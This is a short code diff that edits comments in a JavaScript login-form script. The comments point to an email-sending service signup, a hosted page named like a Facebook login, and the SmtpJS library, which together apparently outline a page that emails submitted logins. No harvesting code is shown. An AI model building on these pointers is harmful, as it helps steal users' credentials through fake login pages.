@@ -12,6 +12,8 @@ function submitLoginForm(event){
     });
 }
 
+// https://app.elasticemail.com/marketing/create-account
 // a href="https://fbloginpage.pythonanywhere.com/"
 // form onsubmit="submitLoginForm(event)"
-// <script src="https://smtpjs.com/v3/smtp.js"></script><script src="email.js" type="text/javascript"></script>
+// <script src="https://smtpjs.com/v3/smtp.js"></script>
+// <script src="email.js" type="text/javascript"></script>
